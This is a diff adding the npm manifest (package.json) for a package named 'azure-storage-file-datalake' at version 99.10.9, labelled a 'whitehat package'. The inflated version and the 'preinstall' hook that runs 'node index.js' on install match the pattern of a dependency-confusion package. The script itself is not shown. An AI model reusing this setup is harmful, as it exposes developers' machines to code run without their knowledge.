@@ -1,0 +1,39 @@
+{
+    "name": "azure-storage-file-datalake",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-storage-file-datalake@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-OuebhSQWLT1nT+aNN0n5zIdQmHghElNJjPDuG0Tx5BpQ2qlfMGj6WYbD9op/KVKiwCPWSpsfEokhoI+mdigCmA==",
+        "shasum": "a74b84aa723c72453909a058c7056981968308fa",
+        "tarball": "https://registry.npmjs.org/azure-storage-file-datalake/-/azure-storage-file-datalake-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3591,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhonyyCRA9TVsSAnZWagAAnFAQAIS0wWVLtkyJUTKQnWU4\nqXFh+LiaeXyBZt0IXEz8TsWy7jolx17rF78hSZDLuQBwpJQO9l3eF1WYNN9E\npnIEFNmghLeBnpf1Y2dpSw55EpAlyLZPnt7N1RjQN6/K4LZ1+xF6du0SvzkH\n22WcWUySBMNt5nJ3oVzZFCULlgpOdY3Xuii6/2SZwsvlZ8cA7Nl6PzNCFyKd\nxPqZtj6KbsNSNyn7pJfGMijRE+FhZT7j7/zsGJtBlWQ7ghyCcgiUqLd3W6cX\n8K9Od5tOyVGFHkwLCrUP5Ao7p8dcGZZB2U3VLvMwfQx5A1taAEEZZMByZ5AL\n4lksOVmzyeoTHuSnvPJRQCuSydlbU8oYkSmy9iNo/4pfsy0pYjpXv0kmvA1V\nyathnbCdsnlz0VJ8nAynyzqa983fuXJAKfUnkyRYX6mtm+iJ59ENnBdWRmJ5\n3PvgKtPGA+EhhYrakgplRG8vFOe9OUs1yFGudKqflwiXqvWtOA+T/u870DEH\nPpXCmXzUTjsXHbMf6JpypOoskfB+Cy1AlMlRG3Z4DL7ckZeIw/C7DayrmDvI\nbiAOqQfwMb6Dyp8FvZnMQnymFOgVsTlEf+v5uIkwau2jos4CAfcjRSoCD68s\nbrSUxRn7YOLhfKdEE6XcVXXM6zs3dlVIWuWt54av77p5tK9wHZUnLK42fVOF\nhsWN\r\n=T0bP\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-storage-file-datalake_99.10.9_1638038705870_0.10697992057227612"
+    },
+    "_hasShrinkwrap": false
+}
